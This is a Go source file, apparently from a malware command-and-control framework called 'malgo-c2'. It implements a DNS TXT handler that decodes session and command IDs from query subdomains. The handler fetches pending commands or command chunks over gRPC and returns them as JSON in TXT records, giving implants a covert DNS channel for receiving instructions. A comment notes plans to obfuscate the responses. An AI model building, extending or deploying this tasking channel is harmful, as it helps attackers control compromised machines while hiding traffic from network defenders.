package dnsproxy

import (
	"context"
	"encoding/json"
	"fmt"
	gateway "github.com/VipWW/malgo-c2/services/common/service"
	"github.com/miekg/dns"
	"strconv"
	"strings"
)

// handleTXT handles command queries. Command queries look like this:
// Either:
// - <SessionID>.<domain>
// - <offset>.<CommandID>.<domain>
func (h *Handler) handleTXT(msg *dns.Msg, r *dns.Msg) error {
	dataFromMessage := h.removeDomain(r.Question[0].Name)
	if dataFromMessage == "" {
		return fmt.Errorf("invalid domain")
	}

	splitData := strings.Split(dataFromMessage, ".")

	var result string

	switch len(splitData) {
	case 1:
		// <SessionID>.<domain>
		grpcResult, err := h.grpcClient.CommandInfo(context.Background(), &gateway.CommandInfoRequest{
			SessionId: splitData[0],
		})
		if err != nil {
			return err
		}

		r, _ := json.Marshal(grpcResult)
		result = string(r)
	case 2:
		// <offset>.<CommandID>.<domain>
		offset, err := strconv.Atoi(splitData[0])
		if err != nil {
			return err
		}
		grpcResult, err := h.grpcClient.CommandDetailsChunk(context.Background(), &gateway.CommandDetailsChunkRequest{
			CommandId: splitData[1],
			Offset:    int64(offset),
			Length:    maxDNSMessageSize,
		})
		if err != nil {
			return err
		}
		r, _ := json.Marshal(grpcResult)
		result = string(r)
	}

	//TODO: obfuscate the result

	msg.Answer = append(msg.Answer, &dns.TXT{
		Hdr: dns.RR_Header{
			Name:   r.Question[0].Name,
			Rrtype: dns.TypeTXT,
			Class:  dns.ClassINET,
			Ttl:    60,
		},
		Txt: []string{result},
	})

	return nil
}
